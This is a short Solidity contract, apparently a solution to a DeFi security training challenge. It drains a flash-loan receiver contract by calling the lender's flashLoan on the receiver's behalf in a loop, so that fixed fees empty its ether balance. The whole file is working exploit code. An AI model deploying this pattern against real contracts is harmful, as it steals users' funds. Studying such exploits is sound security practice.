// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title DrainReceiver
 * @notice Drains `FlashLoanReceiver` contract in a single transaction
 * @author Joshua Oladeji <analogdev.eth>
 */
contract DrainReceiver {
    INaiveReceiverLenderPool flashloanLender;
    IFlashLoanReceiver flashloanReceiver;

    constructor(
        INaiveReceiverLenderPool _flashloanLender,
        IFlashLoanReceiver _flashloanReceiver
    ) {
        flashloanLender = _flashloanLender;
        flashloanReceiver = _flashloanReceiver;
    }

    function attack() external {
        uint256 n = address(flashloanReceiver).balance /
            flashloanLender.fixedFee();
        for (uint256 i = 0; i < n; ) {
            flashloanLender.flashLoan(address(flashloanReceiver), 0);

            unchecked {
                ++i;
            }
        }
    }
}

interface INaiveReceiverLenderPool {
    function fixedFee() external pure returns (uint256);

    function flashLoan(address borrower, uint256 borrowAmount) external;
}

interface IFlashLoanReceiver {
    function receiveEther(uint256 fee) external payable;
}
